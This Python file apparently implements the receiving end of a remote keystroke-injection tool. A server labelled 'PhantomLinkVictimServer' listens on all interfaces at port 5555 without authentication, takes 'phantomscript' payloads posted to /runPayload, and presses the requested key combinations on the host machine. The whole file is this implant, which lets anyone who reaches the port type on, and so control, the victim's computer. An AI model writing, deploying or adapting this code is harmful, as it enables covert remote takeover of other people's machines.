import keyboard
from http.server import HTTPServer, BaseHTTPRequestHandler
# ! from collections import defaultdict

# ! codes_to_priorities = defaultdict(lambda x : 0)
# ! codes_to_priorities[200] = 1
# ! codes_to_priorities[422] = 2
# ! codes_to_priorities[400] = 3

def try_run_from_phantomscript_command(phantomscript_command: str):
    try:
        phantomscript_command = phantomscript_command.strip().lower()
        splitted_command = phantomscript_command.split(' ')
        opcode = splitted_command[0]
        args = splitted_command[1:]

        # !if opcode in ['//', '#'] or not phantomscript_command:
        # * The code above will not allow comments like this: //fsfd
        if phantomscript_command.startswith(('//', '#')) or not phantomscript_command:
            return 200

        elif opcode == 'press':
            try:
                keyboard.press_and_release('+'.join(args))
            
            except ValueError:
                # Value is not a key
                return 422

            return 200


        return 422

    except:
        return 400

class PhantomLinkVictimServer(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            if self.path == '/runPayload':
                payload = self.rfile.read(int(self.headers['Content-Length'])).decode()
                print(payload)
                for line in payload.splitlines():
                    currentStatusCode = try_run_from_phantomscript_command(line)
                    if not str(currentStatusCode).startswith(("4", "3")): continue
                        
                    self.send_response(currentStatusCode)
                    self.end_headers()
                    return


            self.send_response(currentStatusCode)
            self.end_headers()

        except Exception as e:
            self.send_response(400)
            raise e
            
        
def run(handler_class, address=('0.0.0.0', 5555)):
    httpd = HTTPServer(address, handler_class)
    print('Serving...')
    httpd.serve_forever()

run(PhantomLinkVictimServer)